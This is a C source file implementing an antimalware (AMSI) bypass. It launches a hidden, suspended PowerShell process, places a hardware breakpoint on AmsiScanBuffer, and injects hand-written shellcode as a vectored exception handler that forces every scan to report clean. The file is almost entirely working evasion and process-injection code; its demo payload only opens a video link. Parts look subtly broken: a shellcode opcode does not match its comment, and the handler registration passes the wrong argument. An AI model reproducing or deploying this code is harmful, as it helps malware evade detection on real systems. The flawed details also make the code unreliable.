#include <windows.h>
#include <stdio.h>

BOOL CreateProc(PROCESS_INFORMATION* Pi) {
    STARTUPINFOEXW SiEx = { 0 };
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    WCHAR StartupArgs[] = L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"";
    size_t currentLen = lstrlenW(StartupArgs);

    if (!CreateProcessW(NULL, StartupArgs, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SiEx.StartupInfo, Pi)) {
        printf("[!] CreateProcessW Failed: %d\n", GetLastError());
        return FALSE;
    }


    return TRUE;
}

int main(int argc, char** argv) {
    /*

        Objective: prevent Powershell.exe from executing: amsi.dll!AmsiScanBuffer

        The VEH technique relies on 3 principles:
            - AMSI scans originate from the amsi.dll DLL, specifically the function: AmsiScanBuffer()
            - To avoid it, we will redirect the flow of this function so that it terminates prematurely
            - To do this, we will place a HWBP (hardware breakpoint) on the entrypoint of the function and modify the context (RIP + RAX + RSP)
    */

    PROCESS_INFORMATION Pi = {0};

    if (!CreateProc(&Pi)) {
        printf("[!] Failed to create process\n");
        return -1;
    }
    printf("[*] Process created in suspended state ! PID : %d\n", Pi.dwProcessId);

    // 1. Load amsi.dll locally to get the function's address
    // Note: amsi.dll will be mapped to the same address in PowerShell
    HMODULE hLocalAmsi = LoadLibraryA("amsi.dll");
    if (!hLocalAmsi) {
        printf("[!] Failed to load amsi.dll locally: %d\n", GetLastError());
        return -1;
    }

    PVOID pRemoteAmsiScanBuffer = (PVOID)GetProcAddress(hLocalAmsi, "AmsiScanBuffer");
    if (!pRemoteAmsiScanBuffer) {
        printf("[!] Failed to find AmsiScanBuffer: %d\n", GetLastError());
        return -1;
    }

    printf("[+] AmsiScanBuffer resolved at: 0x%p\n", pRemoteAmsiScanBuffer);

    // 2. Place a HWBP on the function's entrypoint
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(Pi.hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    ctx.Dr0 = (DWORD64)pRemoteAmsiScanBuffer; // HWBP on the function's entrypoint

    /* DR7 Configuration:
       Bit 0  : L0 (Local Breakpoint for DR0) -> Set to 1
       Bit 16 : Type for DR0 (00 = Execute)   -> Set to 0
       Bit 18 : Size for DR0 (00 = 1 byte)    -> Set to 0
    */
    ctx.Dr7 |= (1 << 0);   // Activate L0
    ctx.Dr7 &= ~(1 << 16); // Ensure execution (not Read/Write)
    ctx.Dr7 &= ~(1 << 17);
    
    if (!SetThreadContext(Pi.hThread, &ctx)) {
        printf("[!] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] HWBP placed at 0x%p w/ DR0\n", pRemoteAmsiScanBuffer);

    //3. Inject the VEH handler in the remote process

    // Minimal shellcode for the Vectored Handler (x64)
    // This stub checks the exception if it's on our addr, sets RAX=0 (AMSI_RESULT_CLEAN), and adjusts RIP/RSP to simulate a 'ret'
    unsigned char vehStub[] = {
        0x48, 0x8B, 0x51, 0x08,                                         // mov rdx, [rcx + 8] (rdx = ContextRecord)
        0x48, 0x8B, 0x82, 0xF8, 0x00, 0x00, 0x00,                       // mov rax, [rdx + 0xF8] (rax = RIP)
        0x48, 0xBC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov r12, [AmsiScanBufferAddr] (Placeholder offset 13)
        0x4C, 0x39, 0xE0,                                               // cmp rax, r12
        0x75, 0x1A,                                                     // jne skip
        0x48, 0xC7, 0x82, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov [rdx + 0x78], 0 (RAX = 0)
        0x48, 0x8B, 0x82, 0x98, 0x00, 0x00, 0x00,                       // mov rax, [rdx + 0x98] (rax = RSP)
        0x48, 0x8B, 0x00,                                               // mov rax, [rax] (rax = [RSP], the return address)
        0x48, 0x89, 0x82, 0xF8, 0x00, 0x00, 0x00,                       // mov [rdx + 0xF8], rax (RIP = Return address)
        0x48, 0x83, 0x82, 0x98, 0x00, 0x00, 0x00, 0x08,                 // add qword ptr [rdx + 0x98], 8 (RSP += 8)
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,                                   // mov eax, 0xffffffff (EXCEPTION_CONTINUE_EXECUTION)
        0xC3,                                                           // ret
        0x31, 0xC0,                                                     // xor eax, eax (EXCEPTION_CONTINUE_SEARCH)
        0xC3                                                            // ret
    };
    
    *(PVOID*)(vehStub + 13) = pRemoteAmsiScanBuffer; // Patch the address of AmsiScanBuffer in the shellcode

    PVOID pRemoteHandler = VirtualAllocEx(Pi.hProcess, NULL, sizeof(vehStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteHandler) return FALSE;
    WriteProcessMemory(Pi.hProcess, pRemoteHandler, vehStub, sizeof(vehStub), NULL);

    PVOID pAddVEH = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAddVectoredExceptionHandler");
    // Pass pRemoteHandler as an argument (RDX/RCX depending on the call)
    // Note: RtlAddVectoredExceptionHandler(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler)
    // Here we register the handler in the first position (First = 1)
    HANDLE hThread = CreateRemoteThread(Pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddVEH, pRemoteHandler, 0, NULL);

    if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            return TRUE;
        }

    ResumeThread(Pi.hThread);
    Sleep(2);
    WaitForSingleObject(Pi.hProcess, INFINITE);

    CloseHandle(Pi.hThread);
    CloseHandle(Pi.hProcess);
    
    return 0;
}